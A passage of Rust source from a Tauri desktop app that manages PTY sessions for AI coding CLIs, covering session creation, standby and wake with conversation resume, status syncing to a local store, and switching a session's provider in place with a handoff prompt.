    pub fn refresh_resume_ids_from_store(&self, session_id: &str) {
        if legacy_resume_mode() {
            return; // kill switch: no extra GET, local state intact
        }
        let (db_id, provider) = {
            let state = self.state.lock();
            let Some(db_id) = state.db_ids.get(session_id).cloned() else {
                return; // never synced: nothing to reconcile
            };
            let provider = state
                .sessions
                .get(session_id)
                .map(|s| s.provider.clone())
                .unwrap_or_default();
            (db_id, provider)
        };
        // Wake is already the most sensitive moment for perceived latency: the
        // GET is paid only where a remote id would actually change the launch.
        // Providers that resume without an id (gemini, antigravity) gain nothing.
        if !provider_resumes_by_id(&provider) {
            return;
        }
        let auth = self.snapshot_auth();
        let Ok(row) = store_call(&auth, "sessions.get", serde_json::json!({ "id": db_id })) else {
            return;
        };
        let row = &row;
        let remote_sid = row
            .get("claude_session_id")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty());
        let remote_map = row
            .get("config")
            .and_then(|c| c.get("providerSessionIds"))
            .and_then(|m| m.as_object())
            .cloned();
        if remote_sid.is_none() && remote_map.is_none() {
            return;
        }

        let mut state = self.state.lock();
        let Some(session) = state.sessions.get_mut(session_id) else {
            return;
        };
        if let Some(remote) = remote_map {
            let local = session
                .config
                .provider_session_ids
                .get_or_insert_with(|| serde_json::json!({}));
            if !local.is_object() {
                *local = serde_json::json!({});
            }
            if let Some(obj) = local.as_object_mut() {
                for (provider, sid) in remote {
                    if sid.as_str().is_some_and(|s| !s.is_empty()) {
                        obj.insert(provider, sid);
                    }
                }
            }
        }
        if let Some(sid) = remote_sid {
            // The column describes the session's current provider, but does NOT
            // say on which device it was captured: it is promoted only into the
            // bare key, never into the per-device one — marking it as "ours"
            // would attempt a `--resume` on a transcript that is not here.
            let provider = session.provider.clone();
            record_provider_session_id(&mut session.config, &provider, sid, None);
            session.claude_session_id = Some(sid.to_string());
        }
    }

    /// updateStatus — updates the status, emits session:status, syncs the local store.
    fn update_status_locked(state: &mut ManagerState, session_id: &str, new_status: &str) {
        let (old_status, db_id) = {
            let Some(session) = state.sessions.get_mut(session_id) else {
                return;
            };
            let old = session.status.clone();
            session.status = new_status.to_string();
            session.updated_at = now_iso();
            // Resume from waiting_input → expire pending interactions.
            if matches!(new_status, "running" | "in_progress") && old == "waiting_input" {
                session.pending_interactions.clear();
                // TODO: expire the session's pending interactions (InteractionManager).
            }
            (old, state.db_ids.get(session_id).cloned())
        };

        if let Some(channel) = &state.status_channel {
            let _ = channel.send(SessionStatusChange {
                session_id: session_id.to_string(),
                old_status,
                new_status: new_status.to_string(),
            });
        }

        if let Some(db_id) = db_id {
            // The store validates `in:idle,running,in_progress,waiting_input,
            // completed,error`: `exited` would fail the whole update,
            // prompt increment included. To the store an exited agent is idle.
            let store_status = if new_status == "exited" {
                "idle"
            } else {
                new_status
            };
            let mut payload = serde_json::json!({ "status": store_status });
            let delta = state
                .unsynced_prompt_counts
                .get(session_id)
                .copied()
                .unwrap_or(0);
            if delta > 0 {
                payload["terminal_prompt_count_increment"] = serde_json::json!(delta);
                state
                    .unsynced_prompt_counts
                    .insert(session_id.to_string(), 0);
            }
            let auth = AuthSnapshot {
                device_id: state.api_device_id.clone(),
                profile_id: state.active_profile_id.clone(),
            };
            api_update(&auth, &db_id, payload);
        }
    }

    fn snapshot_auth(&self) -> AuthSnapshot {
        let guard = self.state.lock();
        AuthSnapshot {
            device_id: guard.api_device_id.clone(),
            profile_id: guard.active_profile_id.clone(),
        }
    }
}

/// session:update-meta updates.
#[derive(Debug, Default, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct UpdateMeta {
    #[serde(default)]
    pub name: Option<String>,
    #[serde(default)]
    pub workspace_id: Option<Option<String>>,
    #[serde(default)]
    pub view_state: Option<SessionViewState>,
    #[serde(default)]
    pub provider_account_id: Option<Option<String>>,
    /// Windows shell (applied on the next spawn/wake, the live PTY is not touched).
    /// `Some(None)` = back to the platform default.
    #[serde(default, deserialize_with = "deserialize_double_option")]
    pub shell: Option<Option<String>>,
}

/// explicit null → Some(None); missing field → None (via #[serde(default)]).
fn deserialize_double_option<'de, D>(d: D) -> Result<Option<Option<String>>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    Ok(Some(Option::<String>::deserialize(d)?))
}

/// Outcome of [`SessionManager::park_state`].
enum ParkState {
    Already(SessionSummary),
    Parked {
        summary: SessionSummary,
        standby_at: String,
        parked_buf: Option<String>,
        /// The PTY taken off the session: the caller kills it.
        pty: Option<SessionPty>,
    },
}

/// Outcome of [`SessionManager::begin_wake`].
enum WakeStart {
    Unknown,
    NotParked(SessionSummary),
    Start {
        provider: String,
        config: SessionConfig,
        prev_standby_at: String,
    },
}

/// Profile and device snapshot for local store calls made outside the lock.
#[derive(Clone)]
struct AuthSnapshot {
    device_id: Option<String>,
    /// Active session profile (None = Standard profile).
    profile_id: Option<String>,
}

// ─────────────────────────────────────────────────────────────────────────
// Tauri commands.
// ─────────────────────────────────────────────────────────────────────────

/// session:create — creates (or reuses) a session, spawns the provider's PTY,
/// starts the output pump and queues the local store sync.
///
/// Registers the status push channel without going through a create. Previously
/// ONLY session_create registered it: after a restart (restored sessions) or a
/// webview reload there was no channel until you created a session, and the
/// sidebar saw statuses only via the 45 s poll (stale green dots).
#[tauri::command]
pub fn session_status_subscribe(
    manager: tauri::State<'_, Arc<SessionManager>>,
    on_status: Channel<SessionStatusChange>,
) {
    manager.state.lock().status_channel = Some(on_status);
}

/// `on_output` / `on_status` are the two push Channels (session:output / session:status).
#[tauri::command]
pub async fn session_create(
    app: tauri::AppHandle,
    manager: tauri::State<'_, Arc<SessionManager>>,
    request: CreateSessionRequest,
    on_output: Channel<InvokeResponseBody>,
    on_status: Channel<SessionStatusChange>,
) -> Result<CreateResult, String> {
    // spawn_blocking: the spawn pays check_provider (login shell) + openpty —
    // same blocking work as wake (see session_wake),
    // it must not occupy an async worker.
    let manager = manager.inner().clone();
    Ok(tauri::async_runtime::spawn_blocking(move || {
        match create_session(&app, &manager, request, on_output, on_status) {
            Ok(summary) => CreateResult {
                ok: true,
                session: Some(summary),
                error: None,
            },
            Err(err) => {
                eprintln!("Failed to create session: {err}");
                CreateResult {
                    ok: false,
                    session: None,
                    error: Some(err),
                }
            }
        }
    })
    .await
    .unwrap_or_else(|e| CreateResult {
        ok: false,
        session: None,
        error: Some(e.to_string()),
    }))
}

/// session:destroy.
#[tauri::command]
pub async fn session_destroy(
    app: tauri::AppHandle,
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
) -> Result<OkResult, String> {
    // Sub-agent cascade (destroy_by_parent on close): their PTYs
    // must not outlive the parent as orphans. The renderer already removes
    // the stash envelope on deliberate close, so events yes, pushes no.
    {
        use tauri::Manager;
        let local = manager
            .resolve_local_id(&session_id)
            .unwrap_or_else(|| session_id.clone());
        let subs = app
            .state::<Arc<crate::commands::subagent::SubAgentManager>>()
            .inner()
            .clone();
        crate::commands::subagent::destroy_by_parent(&app, &subs, &local, true);
        // interactionManager.clearSession: pending ones die with the PTY.
        app.state::<Arc<crate::commands::interaction::InteractionManager>>()
            .clear_session(&local);
    }
    Ok(match manager.destroy(&session_id, false) {
        Ok(()) => OkResult::ok(),
        Err(err) => {
            eprintln!("Failed to destroy session: {err}");
            OkResult::err(err)
        }
    })
}

/// session:list. Async + spawn_blocking: the renderer's first call
/// waits for the boot restore gate (see boot_restore_gate) — the wait is
/// "free" because the renderer's forkJoin waits for the same
/// api_list HTTP on the saved$ branch anyway. Result because of the Tauri constraint on async
/// with State.
#[tauri::command]
pub async fn session_list(
    manager: tauri::State<'_, Arc<SessionManager>>,
) -> Result<Vec<SessionSummary>, String> {
    let mgr = manager.inner().clone();
    tauri::async_runtime::spawn_blocking(move || {
        mgr.wait_boot_restore(Duration::from_secs(12));
        mgr.list()
    })
    .await
    .map_err(|e| e.to_string())
}

/// session:get — returns the summary or null (None).
#[tauri::command]
pub fn session_get(
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
) -> Option<SessionSummary> {
    manager.get(&session_id)
}

/// session:model — model actually in use by the terminal, read from the
/// provider's log (follows a `/model` done inside the TUI). Pull-only and already
/// cache/stat-gated in the resolver; unsupported providers answer right away
/// `{model:null}` and the renderer falls back to the spawn model.
///
/// `spawn_blocking`: it is disk I/O and the main thread must never see it
/// (see the freeze from the synchronous usage probe).
#[tauri::command]
pub async fn session_current_model(
    manager: tauri::State<'_, Arc<SessionManager>>,
    subs: tauri::State<'_, Arc<crate::commands::subagent::SubAgentManager>>,
    session_id: String,
) -> Result<crate::commands::session_model::ModelResult, String> {
    // Sub-agent child sessions live in the SubAgentManager, not here.
    let meta = manager
        .model_lookup(&session_id)
        .or_else(|| subs.model_lookup(&session_id));
    let Some((provider, cwd, provider_session_id, provider_account_id)) = meta else {
        return Ok(Default::default());
    };
    if !crate::commands::session_model::can_resolve(&provider) {
        return Ok(Default::default());
    }
    let id = session_id.clone();
    let provider_home = provider_home_for_config(&provider, provider_account_id);
    tauri::async_runtime::spawn_blocking(move || {
        crate::commands::session_model::resolve(
            &id,
            &provider,
            cwd.as_deref(),
            provider_session_id.as_deref(),
            provider_home.as_deref(),
        )
    })
    .await
    .map_err(|e| e.to_string())
}

/// session:write.
#[tauri::command]
pub async fn session_write(
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
    data: String,
    count_prompt: Option<bool>,
) -> Result<OkResult, String> {
    Ok(
        match manager.write(&session_id, &data, count_prompt.unwrap_or(true)) {
            Ok(()) => OkResult::ok(),
            Err(err) => OkResult::err(err),
        },
    )
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SessionSwitchProviderRequest {
    pub session_id: String,
    pub provider: String,
    /// Handoff prompt injected into the new TUI.
    pub prompt: String,
    #[serde(default)]
    pub model: Option<String>,
}

/// `session:provider-switch` payload — phases of the in-place switch of the
/// main session: `started` (veil up), `awaiting-user` (CLI startup dialog
/// on screen: veil down, the user answers), `ready` (prompt injected),
/// `handoff-not-delivered` (provider started, handoff not delivered),
/// `error` (meta restored; `reason`: not-started | exited | dialog-timeout).
#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SessionProviderSwitchEvent {
    pub session_id: String,
    pub provider: String,
    pub phase: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub reason: Option<String>,
}

/// Id to resume on switch: the conversation THIS provider has
/// already had in this session, read only from the providerSessionIds map
/// (per-device key if present, otherwise the bare one).
fn switch_resume_id(
    config: &SessionConfig,
    provider: &str,
    device_id: Option<&str>,
) -> Option<String> {
    let family = provider_resume_family(provider);
    let map = config.provider_session_ids.as_ref()?;
    let scoped = device_id
        .filter(|d| !d.is_empty())
        .and_then(|d| map.get(device_scoped_key(family, d)))
        .and_then(|v| v.as_str());
    scoped
        .or_else(|| map.get(family).and_then(|v| v.as_str()))
        .filter(|s| !s.is_empty() && is_safe_session_id(s))
        .map(str::to_string)
}

/// Removes a family's id from the map (failed resume: transcript
/// gone), so a later wake does not retry a dead id.
fn forget_provider_session_id(config: &mut SessionConfig, provider: &str) {
    let family = provider_resume_family(provider);
    if let Some(obj) = config
        .provider_session_ids
        .as_mut()
        .and_then(|m| m.as_object_mut())
    {
        let prefix = format!("{family}@");
        obj.retain(|k, _| k != family && !k.starts_with(&prefix));
    }
}

/// Context for the main switch handoff: the user's last messages
/// in the current conversation and touched files (git status).
#[derive(Clone, Serialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct SessionHandoffContext {
    pub user_messages: Vec<String>,
    pub changed_files: String,
}

/// session:handoff-context — read by the renderer before opening the handoff
/// draft. Best-effort: empty fields if transcript or git are missing.
#[tauri::command]
pub async fn session_handoff_context(
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
) -> Result<SessionHandoffContext, String> {
    let (provider, cwd, sid, account) = {
        let state = manager.state.lock();
        let Some(session) = state.sessions.get(&session_id) else {
            return Ok(SessionHandoffContext::default());
        };
        (
            session.provider.clone(),
            session.config.cwd.clone(),
            session.claude_session_id.clone(),
            session.config.provider_account_id.clone(),
        )
    };
    tauri::async_runtime::spawn_blocking(move || {
        let home = provider_home_for_config(&provider, account);
        let family = provider_resume_family(&provider);
        let user_messages = crate::commands::session_model::recent_user_messages(
            family,
            cwd.as_deref(),
            sid.as_deref(),
            home.as_deref(),
            12,
        );
        let changed_files = cwd
            .as_deref()
            .filter(|c| !crate::commands::remote::is_remote_path(Some(c)))
            .and_then(|c| {
                crate::commands::util_cmd::cmd("git")
                    .args(["status", "--short"])
                    .current_dir(c)
                    .output()
                    .ok()
            })
            .filter(|o| o.status.success())
            .map(|o| {
                let text = String::from_utf8_lossy(&o.stdout);
                text.lines().take(60).collect::<Vec<_>>().join("\n")
            })
            .unwrap_or_default();
        SessionHandoffContext {
            user_messages,
            changed_files,
        }
    })
    .await
    .map_err(|e| e.to_string())
}

/// session:switch-provider — switches the provider of the MAIN session in the same
/// PTY (same flow as subagent_switch_provider): exits the current TUI, launches
/// the new provider in the same login shell (session AA, model),
/// waits for the input box and injects the handoff prompt. The renderer keeps the
/// veil between `started` and `ready`/`error`. The meta (provider, conversation id,
/// stale providerOptions) is updated right away, so a later wake
/// also restarts with the new provider.
#[tauri::command]
pub async fn session_switch_provider(
    app: tauri::AppHandle,
    manager: tauri::State<'_, Arc<SessionManager>>,
    request: SessionSwitchProviderRequest,
) -> Result<OkResult, String> {
    use crate::commands::subagent::{
        exit_tui_with, paste_evidence_seen, paste_verification_enabled, sanitize_model_flag,
        settle_after_launch_with, shell_prompt_visible, startup_dialog_visible, tail_has_marker,
        wait_launch_outcome_with, wait_startup_dialog_cleared, DialogWait, LaunchOutcome, BPM_END,
        BPM_START,
    };
    let provider = request.provider.clone();
    if provider == "generic-shell" {
        return Ok(OkResult::err("Cannot switch a session to generic-shell"));
    }
    let model = sanitize_model_flag(request.model.as_deref());
    let (writer, buffer, config, previous, resume_sid) = {
        let mut state = manager.state.lock();
        let device_id = state.api_device_id.clone();
        let Some(session) = state.sessions.get_mut(&request.session_id) else {
            return Ok(OkResult::err(format!(
                "Session not found: {}",
                request.session_id
            )));
        };
        let Some(pty) = session.pty.as_ref() else {
            return Ok(OkResult::err("Session has no live PTY (standby?)"));
        };
        // Previous meta: restored if the new provider does not start, so a
        // wake does not relaunch a provider that is not there.
        let previous = (
            session.provider.clone(),
            session.claude_session_id.clone(),
            session.config.provider_options.clone(),
        );
        // Going back to a provider already used in THIS session resumes
        // ITS conversation (providerSessionIds map), not a new one: the
        // decisions made with it stay (UX audit 10/2026, item 4).
        // ONLY from the per-provider map (never claudeSessionId or "current id"),
        // and never within the same family (claude → zai/kimi starts clean as
        // in 2.1.7: Anthropic-signed transcripts on compatible endpoints).
        let same_family = provider_resume_family(&provider) == provider_resume_family(&previous.0);
        let resume_sid = (!same_family && provider_resumes_by_id(&provider))
            .then(|| switch_resume_id(&session.config, &provider, device_id.as_deref()))
            .flatten();
        // Meta: new provider, conversation id cleared, the old provider's
        // providerOptions (command/args/resume) discarded. The model,
        // if given, travels as args of the new provider.
        session.provider = provider.clone();
        session.claude_session_id = None;
        session.config.provider_options = match (&model, model_flag(&provider)) {
            (Some(m), Some(flag)) => Some(serde_json::json!({ "args": format!("{flag} {m}") })),
            _ => None,
        };
        session.updated_at = now_iso();
        (
            pty.writer.clone(),
            pty.buffer.clone(),
            session.config.clone(),
            previous,
            resume_sid,
        )
    };
    let fresh_sid = if provider_resume_family(&provider) == "claude-code-cli"
        && crate::commands::subagent::claude_supports_session_id()
    {
        Some(uuid::Uuid::new_v4().to_string())
    } else {
        None
    };
    let Some(fresh_launch) = build_launch_command_inner(
        &provider,
        &config,
        None,
        false,
        fresh_sid.as_deref(),
        Some(&request.session_id),
    ) else {
        // Nothing was launched: put the previous meta back, or a later wake
        // would relaunch a provider that never started here.
        let (prev_provider, prev_sid, prev_options) = previous;
        if let Some(session) = manager.state.lock().sessions.get_mut(&request.session_id) {
            session.provider = prev_provider;
            session.claude_session_id = prev_sid;
            session.config.provider_options = prev_options;
        }
        return Ok(OkResult::err(format!(
            "No launch command for provider {provider}"
        )));
    };
    let resume_launch = resume_sid.as_deref().and_then(|sid| {
        build_launch_command_inner(
            &provider,
            &config,
            Some(sid),
            false,
            None,
            Some(&request.session_id),
        )
    });
    match (&resume_launch, &resume_sid, &fresh_sid) {
        (Some(_), Some(sid), _) => manager.set_claude_session_id(&request.session_id, sid),
        (_, _, Some(sid)) => manager.set_claude_session_id(&request.session_id, sid),
        _ => {}
    }

    let emit_phase = {
        let app = app.clone();
        let session_id = request.session_id.clone();
        let provider = provider.clone();
        move |phase: &str, reason: Option<&str>| {
            let _ = app.emit(
                "session:provider-switch",
                SessionProviderSwitchEvent {
                    session_id: session_id.clone(),
                    provider: provider.clone(),
                    phase: phase.to_string(),
                    reason: reason.map(str::to_string),
                },
            );
        }
    };
    emit_phase("started", None);

    let mgr = Arc::clone(manager.inner());
    let session_id = request.session_id.clone();
    let prompt = request.prompt.clone();
    let provider_home = provider_home_for_config(&provider, config.provider_account_id.clone());
    std::thread::spawn(move || {
        let spawned_at_ms = crate::commands::provider_session_probe::now_ms();
        let sample = || {
            let b = buffer.lock();
            Some((b.len(), shell_prompt_visible(&b.data)))
        };
        if !exit_tui_with(&sample, &writer) {
            eprintln!("[SessionManager] switch: shell prompt not detected for {session_id}, launching anyway");
        }
        let mut alive = false;
        // Resume the previous conversation if there is one; if the CLI exits right away
        // (transcript gone) fall back to a fresh launch.
        let mut launch = resume_launch
            .clone()
            .unwrap_or_else(|| fresh_launch.clone());
        for attempt in 1..=3 {
            // Buffer cleared (total stays monotonic → replay dedup ok).
            buffer.lock().data.clear();
            let line = guarded_launch_line(&launch);
            let _ = writer.lock().write_all(line.as_bytes());
            match wait_launch_outcome_with(&sample) {
                LaunchOutcome::Alive => {
                    alive = true;
                    break;
                }
                LaunchOutcome::Destroyed => return,
                LaunchOutcome::Exited => {
                    eprintln!("[SessionManager] switch: {provider} exited right after launch (attempt {attempt}/3) for {session_id}");
                    if resume_launch.as_ref() == Some(&launch) {
                        eprintln!("[SessionManager] switch: resume failed for {session_id}, launching a fresh conversation");
                        launch = fresh_launch.clone();
                        if let Some(session) = mgr.state.lock().sessions.get_mut(&session_id) {
                            forget_provider_session_id(&mut session.config, &provider);
                            session.claude_session_id = None;
                        }
                        if let Some(sid) = &fresh_sid {
                            mgr.set_claude_session_id(&session_id, sid);
                        }
                    }
                    std::thread::sleep(std::time::Duration::from_millis(700));
                }
            }
        }
        let fail = |reason: &str| {
            let (prev_provider, prev_sid, prev_options) = previous.clone();
            {
                let mut state = mgr.state.lock();
                if let Some(session) = state.sessions.get_mut(&session_id) {
                    session.provider = prev_provider;
                    session.config.provider_options = prev_options;
                    session.claude_session_id = None;
                }
            }
            if let Some(sid) = prev_sid {
                mgr.set_claude_session_id(&session_id, &sid);
            }
            emit_phase("error", Some(reason));
        };
        if !alive {
            fail("not-started");
            return;
        }
        let sample_markers = |markers: &[&str]| {
            let b = buffer.lock();
            Some((b.len(), tail_has_marker(&b.data, markers)))
        };
        settle_after_launch_with(&provider, &sample_markers);
        // CLI trust/update dialog: NEVER answer on the user's
        // behalf. Veil down, wait for their choice, then resume.
        let sample_dialog = || {
            let b = buffer.lock();
            Some((
                startup_dialog_visible(&b.data, &provider),
                shell_prompt_visible(&b.data),
            ))
        };
        if matches!(sample_dialog(), Some((true, false))) {
            eprintln!("[SessionManager] switch: {provider} startup dialog visible for {session_id} — waiting for the user");
            emit_phase("awaiting-user", None);
            match wait_startup_dialog_cleared(&sample_dialog) {
                DialogWait::Destroyed => return,
                DialogWait::TimedOut => {
                    // The new CLI is alive behind the dialog: restoring the
                    // old meta would relaunch the wrong provider on wake.
                    // New meta, handoff not delivered.
                    persist_provider_switch(&mgr, &session_id);
                    emit_phase("handoff-not-delivered", Some("dialog-timeout"));
                    return;
                }
                DialogWait::Cleared => {
                    settle_after_launch_with(&provider, &sample_markers);
                }
            }
        }
        if shell_prompt_visible(&buffer.lock().data) {
            eprintln!("[SessionManager] switch: {provider} TUI not running for {session_id} — prompt NOT injected");
            fail("exited");
            return;
        }
        let profile = crate::commands::tui_injection::injection_profile(&provider);
        let payload = format!("{BPM_START}{prompt}{BPM_END}");
        // Verified paste (claude family) with re-paste: Enter ONLY once the paste
        // is seen. A blind Enter on a dialog picks the default.
        let verify = paste_verification_enabled(&provider);
        let mut landed = !verify;
        for attempt in 0..3 {
            let mark = buffer.lock().len();
            let _ = writer.lock().write_all(payload.as_bytes());
            if !verify {
                break;
            }
            let start = std::time::Instant::now();
            while start.elapsed() < std::time::Duration::from_millis(2_500) {
                std::thread::sleep(std::time::Duration::from_millis(50));
                let b = buffer.lock();
                if b.len() > mark && paste_evidence_seen(&b.data[mark.min(b.data.len())..], &prompt)
                {
                    landed = true;
                    break;
                }
            }
            if landed {
                break;
            }
            eprintln!("[SessionManager] switch: handoff paste not visible for {session_id} (attempt {}/3)", attempt + 1);
            settle_after_launch_with(&provider, &sample_markers);
        }
        // Paste seen = the TUI accepted input (no dialog). No
        // dialog recheck here: the buffer now contains the handoff, which
        // may quote "Do you trust…" from the previous provider's output.
        if !landed {
            // Provider alive, handoff not delivered: the meta stays the
            // new one, control passes to the user.
            persist_provider_switch(&mgr, &session_id);
            emit_phase("handoff-not-delivered", None);
            return;
        }
        std::thread::sleep(std::time::Duration::from_millis(profile.enter_delay_ms));
        let _ = writer.lock().write_all(b"\r");
        {
            let mut state = mgr.state.lock();
            SessionManager::update_status_locked(&mut state, &session_id, "in_progress");
        }
        mgr.increment_prompt_count(&session_id, 1);
        start_provider_session_probe(
            &mgr,
            &session_id,
            &provider,
            config.cwd.as_deref().unwrap_or(""),
            spawned_at_ms,
            provider_home,
        );
        persist_provider_switch(&mgr, &session_id);
        emit_phase("ready", None);
    });
    Ok(OkResult::ok())
}

/// Shared crediting of a turn: session id → SessionManager's internal
/// bubble-up; sub-agent id (PTY in SubAgentManager) → parent session.
/// Called on tailer:auto-approved, interaction:resolved and worker-turn-usage.
pub fn credit_prompt_for(app: &tauri::AppHandle, id: &str, amount: u64) {
    use tauri::Manager;
    let sessions = app.state::<Arc<SessionManager>>().inner().clone();
    if sessions.has_session(id) {
        sessions.increment_prompt_count(id, amount);
        return;
    }
    let subs = app
        .state::<Arc<crate::commands::subagent::SubAgentManager>>()
        .inner()
        .clone();
    if let Some(parent) = subs.parent_of(id) {
        sessions.increment_prompt_count(&parent, amount);
    }
}

/// creditAiPrompt (db/git/intent-handlers): credits a successful AI utility
/// feature to the ranking. Fire-and-forget — counting must never break the
/// feature; no prompt text in the payload.
pub fn credit_ai_utility(
    app: &tauri::AppHandle,
    feature: &str,
    session_id: Option<&str>,
    cwd: Option<&str>,
) {
    credit_ai_utility_with_text(app, feature, session_id, cwd, None)
}

/// Same as `credit_ai_utility`; callers that have the prompt text pass it,
/// and it is not kept anywhere.
pub fn credit_ai_utility_with_text(
    app: &tauri::AppHandle,
    _feature: &str,
    session_id: Option<&str>,
    cwd: Option<&str>,
    _text: Option<&str>,
) {
    use tauri::Manager;
    let sessions = app.state::<Arc<SessionManager>>().inner().clone();
    let target = sessions.resolve_utility_prompt_target(session_id, cwd);
    if let Some(target) = &target {
        sessions.increment_prompt_count(target, 1);
    }
}

/// session:resize.
#[tauri::command]
pub fn session_resize(
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
    cols: u16,
    rows: u16,
) -> OkResult {
    match manager.resize(&session_id, cols, rows) {
        Ok(()) => OkResult::ok(),
        Err(err) => OkResult::err(err),
    }
}

/// session:rename.
#[tauri::command]
pub fn session_rename(
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
    name: String,
) -> OkResult {
    manager.rename(&session_id, &name);
    OkResult::ok()
}

/// session:update-meta.
#[tauri::command]
pub fn session_update_meta(
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
    updates: UpdateMeta,
) -> OkResult {
    manager.update_meta(&session_id, &updates);
    OkResult::ok()
}

/// session:buffer — raw PTY output for replay. RAW response: 8 bytes
/// u64 LE of endOffset + payload (up to 512KB, which as a JSON string paid for
/// escaping + parsing in the webview). endOffset=0 → no live dedup (parked).
/// Error (unknown session) → Err: the bridge normalizes it to {ok:false}.
#[tauri::command]
pub async fn session_buffer(
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
) -> Result<tauri::ipc::Response, String> {
    // spawn_blocking: the buffer copy stays off the main thread
    // (it was visible jank on every session attach/switch).
    let manager = manager.inner().clone();
    tauri::async_runtime::spawn_blocking(move || {
        manager
            .replay_payload(&session_id)
            .map(tauri::ipc::Response::new)
    })
    .await
    .map_err(|e| e.to_string())?
}

/// session:standby — parks the session (PTY kill, record preserved).
#[tauri::command]
pub async fn session_standby(
    app: tauri::AppHandle,
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
) -> Result<Option<SessionSummary>, String> {
    Ok(manager.standby(&app, &session_id))
}

/// session:wake — wakes a parked session: PTY respawn with
/// provider resume (claude --resume <claudeSessionId>) on a new Channel.
#[tauri::command]
pub async fn session_wake(
    app: tauri::AppHandle,
    manager: tauri::State<'_, Arc<SessionManager>>,
    session_id: String,
    on_output: Channel<InvokeResponseBody>,
    cols: Option<u16>,
    rows: Option<u16>,
) -> Result<Option<SessionSummary>, String> {
    // spawn_blocking: wake pays check_provider (login shell) + PTY spawn —
    // seconds of blocking work that must not occupy an async worker.
    let manager = manager.inner().clone();
    tauri::async_runtime::spawn_blocking(move || {
        wake_session_impl(&app, &manager, &session_id, on_output, cols, rows)
    })
    .await
    .map_err(|e| e.to_string())?
}

/// Wake without a renderer (e.g. after folder access comes back): sink output
/// channel, the replay comes from the buffer. The desktop renderer gets a
/// stream again on its next standby→wake.
pub fn wake_without_renderer(
    app: &tauri::AppHandle,
    manager: &Arc<SessionManager>,
    session_id: &str,
) {
    let sink: Channel<InvokeResponseBody> = Channel::new(|_| Ok(()));
    if let Err(err) = wake_session_impl(app, manager, session_id, sink, None, None) {
        eprintln!("[session] wake without renderer failed: {err}");
    }
}

/// wakeSession — wakes a parked session and respawns it with provider resume.
pub(crate) fn wake_session_impl(
    app: &tauri::AppHandle,
    manager: &Arc<SessionManager>,
    session_id: &str,
    on_output: Channel<InvokeResponseBody>,
    cols: Option<u16>,
    rows: Option<u16>,
) -> Result<Option<SessionSummary>, String> {
    use tauri::Emitter;

    // resolveSession: the renderer may pass the local id or the stored dbId
    // (session restored at boot) — without this resolution, wake by dbId
    // would clear standby_at in the store without respawning anything.
    let resolved = manager
        .resolve_local_id(session_id)
        .unwrap_or_else(|| session_id.to_string());
    let session_id = resolved.as_str();

    // The in-RAM record may be stale: if in the meantime the stored record
    // got a newer conversation id, it exists only there — and without this reconciliation the resume would point to
    // an old conversation or not start at all. Skipped for an account-switch
    // relaunch: the conversation starts fresh (begin_wake drops the old id).
    let fresh_relaunch = manager.state.lock().fresh_relaunch.contains(session_id);
    if !fresh_relaunch {
        manager.refresh_resume_ids_from_store(session_id);
    }

    // Agents: lead closed by the user → wake does NOT respawn the session
    // PTY. It only clears the standby marker (memory + store) and returns the
    // summary; parked sub-agents are restored by the caller via stash
    // (the subagent_restore_stash poll knows how to skip waiting for the PTY).
    if crate::commands::agents::is_lead_closed(manager, session_id) {
        let Some((summary, db_id)) = manager.wake_closed_lead_state(session_id) else {
            return Ok(None);
        };
        if let Some(db_id) = db_id.clone() {
            let auth = manager.snapshot_auth();
            api_update(
                &auth,
                &db_id,
                serde_json::json!({ "standby_at": JsonValue::Null }),
            );
        }
        let _ = app.emit(
            "session:standby-changed",
            serde_json::json!({ "sessionId": session_id, "standbyAt": JsonValue::Null }),
        );
        return Ok(Some(summary.with_db_id(db_id).with_respawned(false)));
    }

    let (provider, config, prev_standby_at) = match manager.begin_wake(session_id, cols, rows) {
        WakeStart::Unknown => {
            let auth = manager.snapshot_auth();
            // Only the stored marker (api_update queues, never blocking).
            api_update(
                &auth,
                session_id,
                serde_json::json!({ "standby_at": JsonValue::Null }),
            );
            return Ok(None);
        }
        WakeStart::NotParked(summary) => return Ok(Some(summary.with_respawned(false))),
        WakeStart::Start {
            provider,
            config,
            prev_standby_at,
        } => (provider, config, prev_standby_at),
    };

    match spawn_session_pty(app, manager, session_id, &provider, &config, on_output) {
        Ok(()) => {
            // Same as create_session: live PTY = "idle" RIGHT AWAY (alive but
            // still: the turn is opened by a hook or PTY output). The
            // restored ones start as "standby" and without this flip the
            // subagent_restore_stash poll waited for claude's SessionStart hook
            // (seconds) before respawning the sub-agents.
            let awake = manager.mark_pty_live(session_id);
            let Some(summary) = manager.get(session_id) else {
                return Ok(None);
            };
            if !awake {
                // Parked again (or closed) right after the PTY registered: the
                // park already reported it; do not announce a wake.
                return Ok(Some(summary.with_respawned(false)));
            }
            let summary = summary.with_respawned(true);
            let db_id = summary.db_id.clone();
            if let Some(db_id) = db_id {
                let auth = manager.snapshot_auth();
                // Fire-and-forget: the standby_at PUT must not delay the
                // response to the renderer (the cover stays up until it returns).
                api_update(
                    &auth,
                    &db_id,
                    serde_json::json!({ "standby_at": JsonValue::Null }),
                );
            }
            let _ = app.emit(
                "session:standby-changed",
                serde_json::json!({ "sessionId": session_id, "standbyAt": JsonValue::Null }),
            );
            Ok(Some(summary))
        }
        Err(err) => {
            // Re-park: never leave the session half-awake (e.g. folder
            // access denied). A park that arrived meanwhile already set its
            // own marker: keep it.
            {
                let mut guard = manager.state.lock();
                if let Some(session) = guard.sessions.get_mut(session_id) {
                    if session.standby_at.is_none() && session.pty.is_none() {
                        session.standby_at = Some(prev_standby_at.clone());
                    }
                }
            }
            let _ = app.emit(
                "session:standby-changed",
                serde_json::json!({ "sessionId": session_id, "standbyAt": prev_standby_at }),
            );
